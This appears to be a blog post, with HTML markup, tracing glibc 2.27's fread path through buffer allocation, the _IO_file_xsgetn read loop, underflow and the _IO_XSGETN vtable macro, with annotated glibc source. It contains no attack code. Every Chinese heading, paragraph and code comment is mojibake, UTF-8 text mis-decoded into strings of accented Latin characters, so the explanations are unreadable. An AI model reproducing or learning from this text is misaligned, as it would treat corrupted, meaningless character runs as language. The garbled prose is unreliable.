<h4 id="ç”³è¯·ç¼“å†²åŒº"><a href="#ç”³è¯·ç¼“å†²åŒº" class="headerlink" title="ç”³è¯·ç¼“å†²åŒº"></a>ç”³è¯·ç¼“å†²åŒº</h4><p>freadåŒ…è£…äº†readç³»ç»Ÿè°ƒç”¨, åœ¨å †å—ä¸Šå»ºç«‹ç¼“å†²åŒº, ä¸€æ¬¡æ€§ä½¿ç”¨readè¯»å–å¤§é‡æ•°æ®åˆ°ç¼“å†²åŒº,å‡å°‘å¤šæ¬¡è°ƒç”¨readé€ æˆçš„ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œioå¼€é”€</p>
<p>ç¬¬ä¸€æ¬¡è°ƒç”¨freadå‡½æ•°,_IO_file_xsgetné¦–å…ˆåˆ¤æ–­å½“å‰FILEæ˜¯å¦æœ‰ç¼“å†²åŒº,å¦‚æœæ²¡æœ‰åˆ™ç”³è¯·ä¸€ä¸ª,ä¼šåœ¨å †ä¸Šè¦0x1000ä¸ªå­—èŠ‚çš„å †å—,ä¹Ÿå°±æ˜¯1Kçš„å †å—ä½œä¸ºç¼“å†²åŒº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br><span class="line">			-&gt;_IO_doallocbuf</span><br><span class="line">				-&gt;_IO_file_doallocate @glibc2<span class="number">.27</span>/libio/filedoalloc.c:<span class="number">77</span></span><br><span class="line">					-&gt;p=<span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line">					-&gt;_IO_setb(_IO_FILE *f=fp, <span class="type">char</span> *b=p, <span class="type">char</span> *eb=p+<span class="number">0x1000</span>, <span class="type">int</span> a=<span class="number">1</span>)	@glibc2<span class="number">.27</span>/libio/genops.c: <span class="number">346</span></span><br><span class="line">						å¦‚æœfpä¹‹å‰æœ‰ç¼“å†²åŒº,ç°åœ¨è¦å–œæ–°åŒæ—§äº†</span><br><span class="line">						fp-&gt;_IO_buf_base=b</span><br><span class="line">						fp-&gt;_IO_buf_end=eb</span><br><span class="line">						<span class="keyword">if</span>(a == <span class="number">1</span>) f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>

<p>ç”³è¯·ç¼“å†²åŒºè¿™éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);						<span class="comment">//ç”³è¯·ç¼“å†²åŒºå»äº†</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>ç”³è¯·å®Œäº†åå¼€å§‹è¯»å–</p>
<h4 id="è¯»å–æ•°æ®"><a href="#è¯»å–æ•°æ®" class="headerlink" title="è¯»å–æ•°æ®"></a>è¯»å–æ•°æ®</h4><p>è¯»å–çš„é€»è¾‘æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//haveè¡¨ç¤ºå½“å‰ç¼“å†²åŒºä¸­,å‰©ä½™å­—èŠ‚æ•°</span><br><span class="line">//wantè¡¨ç¤ºè¿˜å‰©å¤šå°‘å­—èŠ‚éœ€è¦è¯»,å½“wanté™ä¸º0æ—¶æ„å‘³ç€æ»¡è¶³äº†éœ€æ±‚</span><br><span class="line"></span><br><span class="line">å¦‚æœç¼“å†²åŒºä½™æ–™å¤šäºéœ€æ±‚,åˆ™ç›´æ¥æ»¡è¶³</span><br><span class="line">å¦åˆ™</span><br><span class="line">	å¦‚æœä¸€æ•´ä¸ªç¼“å†²åŒºçš„å¤§å°è¶³å¤Ÿwantåˆ™å…ˆæ”¾åˆ°ç¼“å†²åŒºç„¶åæ»¡è¶³</span><br><span class="line">	å¦åˆ™ä¹Ÿå°±æ˜¯è¯´ä¸€æ•´ä¸ªç¼“å†²åŒºå¤§å°éƒ½ä¸å¤Ÿ,æ­¤æ—¶ç¼“å†²æ²¡æœ‰æ„ä¹‰äº†,ç›´æ¥å…¨ç³»ç»Ÿè°ƒç”¨æ»¡è¶³</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)		<span class="comment">//fpæ–‡ä»¶æŒ‡é’ˆ,dataç›®çš„åœ°,næ€»å…±éœ€è¦è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;		<span class="comment">//wantå‰©ä½™æƒ³è¦è¯»å–çš„å­—èŠ‚æ•°, haveç¼“å†²åŒºå‰©ä½™çš„å­—èŠ‚æ•°</span></span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span> *s = data;				<span class="comment">//sä½œä¸ºdataçš„è¿­ä»£å™¨</span></span><br><span class="line"></span><br><span class="line">  want = n;					</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ­¤å¤„ç•¥å»æ²¡æœ‰ç¼“å†²åŒºæ—¶ç”³è¯·ç¼“å†²åŒºçš„é€»è¾‘</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;				<span class="comment">//ç›´åˆ°è¯»å–åˆ°æ–‡ä»¶EOFæˆ–è€…æ»¡è¶³äº†wantçš„è¦æ±‚æ‰ä¼šè·³å‡ºå¾ªç¯</span></span><br><span class="line">      	have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;		<span class="comment">//ç¼“å†²åŒºæœ«å°¾ä¸å½“å‰æŒ‡é’ˆçš„è·ç¦»,å°±æ˜¯ç¼“å†²åŒºå‰©ä½™å­—èŠ‚æ•°</span></span><br><span class="line">      	<span class="keyword">if</span> (want &lt;= have)&#123;								<span class="comment">//å¦‚æœç¼“å†²åŒºä¸­ä½™æ–™å……è¶³</span></span><br><span class="line">	  		<span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);				</span><br><span class="line">	  		fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  		want = <span class="number">0</span>;									<span class="comment">//å·²æ»¡è¶³è¦æ±‚</span></span><br><span class="line">		&#125; <span class="keyword">else</span>	&#123;										<span class="comment">//å¦åˆ™</span></span><br><span class="line">            	<span class="comment">//å¦‚æœæ§åˆ¶æµåˆ°æ­¤,è¯´æ˜ç¼“å†²åŒºä½™æ–™å¤ªå°‘äº†,ä¸èƒ½ç›´æ¥æ»¡è¶³wantè¦æ±‚</span></span><br><span class="line">	  		<span class="keyword">if</span> (have &gt; <span class="number">0</span>)&#123;								<span class="comment">//å¦‚æœç¼“å†²åŒºè¿˜æœ‰ä½™æ–™</span></span><br><span class="line">	      		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);	<span class="comment">//å…ˆæŠŠä½™æ–™åƒäº†å†è¯´</span></span><br><span class="line">	      		want -= have;						</span><br><span class="line">	      		fp-&gt;_IO_read_ptr += have;			<span class="comment">//æ­¤ä¸¾å¯¼è‡´read_ptr=read_end,ç¼“å†²åŒºå‘Šç½„</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  		<span class="keyword">if</span> (_IO_in_backup (fp))&#123;				<span class="comment">//å½“ä¸Šä¸€æ¬¡åˆ·æ–°ç¼“å†²åŒºè¢«ä¸­æ–­è€Œæ²¡æœ‰å®Œæˆæ—¶,ä¸Šæ¬¡åŠ¨ä½œä¼šä¿å­˜åœ¨backupç¼“å†²åŒº,ç°åœ¨è¦å®Œæˆæœªç«Ÿä¹‹äº‹</span></span><br><span class="line">	      		_IO_switch_to_main_get_area (fp);</span><br><span class="line">	      		<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//bufæ˜¯æ•´ä¸ªç¼“å†²åŒº,è€Œreadæ˜¯å½“å‰æœ‰æ•ˆçš„ç¼“å†²åŒº,æ­¤ä¸¾åœ¨åˆ¤æ–­wantæ˜¯å¦å°äºæ•´ä¸ªç¼“å†²åŒº</span></span><br><span class="line">            <span class="comment">//å½“wantå°äºä¸€æ•´ä¸ªç¼“å†²åŒºæ—¶,åˆ·æ–°ç¼“å†²åŒºæ‰æœ‰æ„ä¹‰,</span></span><br><span class="line">            <span class="comment">//å¦‚æœwantå¤§äºä¸€æ•´ä¸ªç¼“å†²åŒº,é‚£ä¹ˆæ­¤æ—¶åˆ·æ–°ç¼“å†²åªä¼šå¢åŠ io,ä¸å¦‚ç›´æ¥syscall read</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (__underflow (fp) == EOF)	<span class="comment">//åªæœ‰å½“wantå°äºä¸€æ•´ä¸ªç¼“å†²åŒºæ—¶æ‰ä¼šè€ƒè™‘åˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">					<span class="keyword">break</span>;									</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">            <span class="comment">//ç¼“å†²åŒºå¤ä½</span></span><br><span class="line">	  		_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  		_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  		count = want;	<span class="comment">//countç”¨äºè®¡ç®—éœ€è¦ä½¿ç”¨syscall-readè¿›è¡Œioçš„å­—èŠ‚æ•°</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base)&#123;</span><br><span class="line">	      		_IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      		<span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">					count -= want % block_size;<span class="comment">//å‡å»æœ€åä¸€ä¸ªä¸å®Œæ•´çš„å—å¤§å°</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		count = _IO_SYSREAD (fp, s, count);							<span class="comment">//æŠŠæ•´æ•°ä¸ªå—ç›´æ¥è¯»å‡ºæ¥		</span></span><br><span class="line">	  		<span class="keyword">if</span> (count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">					fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      		<span class="keyword">else</span></span><br><span class="line">					fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">	      		<span class="keyword">break</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		s += count;</span><br><span class="line">	  		want -= count;											<span class="comment">//åˆ°æ­¤wantå¯èƒ½è¿˜æœ‰å‰©ä¸‹çš„æœ€åä¸å®Œæ•´çš„ä¸€å—,ä¸‹ä¸€æ¬¡å¾ªç¯æ—¶åˆ·æ–°ç¼“å†²åŒºæ»¡è¶³</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    		_IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="underflow"><a href="#underflow" class="headerlink" title="underflow"></a>underflow</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__underflow @</span><br><span class="line">	-&gt;_IO_new_file_underflow @fileops.c:<span class="number">469</span></span><br><span class="line">		æŒ‡é’ˆå¤ä½</span><br><span class="line">		-&gt;_IO_file_read</span><br><span class="line">			-&gt;_IO_new_file_underflow</span><br><span class="line">				-&gt;__read(fp-&gt;_fileno, buf, size)</span><br></pre></td></tr></table></figure>

<p>freadè°ƒç”¨çš„underflowå’Œfwriteè°ƒç”¨çš„overflowæ˜¯ä¸€å¯¹å…„å¼Ÿå‡½æ•°</p>
<p>underflowæ„æ€æ˜¯ä»æ–‡ä»¶å¾€ç¼“å†²åŒºè½½å…¥æ•°æ®,ç»´æŒè¯»ç¼“å†²åŒºæ»¡</p>
<p>overflowæ„æ€æ˜¯ä»ç¼“å†²åŒºå‘æ–‡ä»¶å†™å…¥æ•°æ®,ç»´æŒå†™ç¼“å†²åŒºç©º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)<span class="comment">//å¦‚æœå½“å‰fpå­—èŠ‚æµä½¿ç”¨å®½å­—èŠ‚,åˆ™è°ƒç”¨fwide</span></span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))<span class="comment">//å¦‚æœå½“å‰fpå¤„äºå†™å…¥çŠ¶æ€,åˆ™åˆ‡æ¢çŠ¶æ€ä¸ºè¯»å–çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//å¦‚æœç¼“å†²åŒºè¿˜æœ‰ä¸œè¥¿åˆ™è¿”å›å½“å‰read_ptræŒ‡å‘çš„å­—èŠ‚</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))			</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>_IO_UNDERFLOW</code>å®é™…ä¸Šè°ƒç”¨çš„_<code>IO_new_file_underflow</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_underflow(FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)		<span class="comment">//å¿…é¡»è¦æœ‰READæƒé™</span></span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno(EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//å¦‚æœç¼“å†²åŒºè¿˜æœ‰å‰©ä½™çš„ä¸œè¥¿,åˆ™ä¸å…è®¸åˆ·æ–°</span></span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">//å¦‚æœè¿˜æ²¡æœ‰å»ºç«‹ç¼“å†²åŒº,ç°åœ¨å°±å»ºç«‹</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_doallocbuf(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))		<span class="comment">//å¯¹äºè¡Œç¼“å†²å’Œæ— ç¼“å†²çš„æƒ…å†µ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">       required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">       traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">       not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">       explicitly.  --drepper */</span></span><br><span class="line">        _IO_acquire_lock(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">            _IO_OVERFLOW(<span class="built_in">stdout</span>, EOF);<span class="comment">//åˆ·æ–°stdoutç¼“å†²</span></span><br><span class="line"></span><br><span class="line">        _IO_release_lock(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _IO_switch_to_get_mode(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">       pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">       we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">       input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<span class="comment">//ç¼“å†²åŒºå¤ä½</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,		<span class="comment">//ç¼“å†²åŒºæ›´æ–°,ä»æ–‡ä»¶è¯»å–,å¡æ»¡æ•´ä¸ªç¼“å†²åŒº</span></span><br><span class="line">                        fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">            fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_IO_read_end += count;			<span class="comment">//è¯»ç¼“å†²åŒºæ ¹æ®å®é™…countæ•°å†³å®š</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">       handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">       unset it.  */</span></span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="vtableä½•æ—¶å‘æŒ¥ä½œç”¨"><a href="#vtableä½•æ—¶å‘æŒ¥ä½œç”¨" class="headerlink" title="vtableä½•æ—¶å‘æŒ¥ä½œç”¨?"></a>vtableä½•æ—¶å‘æŒ¥ä½œç”¨?</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br></pre></td></tr></table></figure>

<p>ä»<code>_IO_sgetn</code>è°ƒç”¨<code>_IO_file_xsgetn</code>æ—¶é¦–å…ˆéœ€è¦â€˜è°ƒç”¨â€™<code>_IO_XSGETN</code>,è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªå®å®šä¹‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

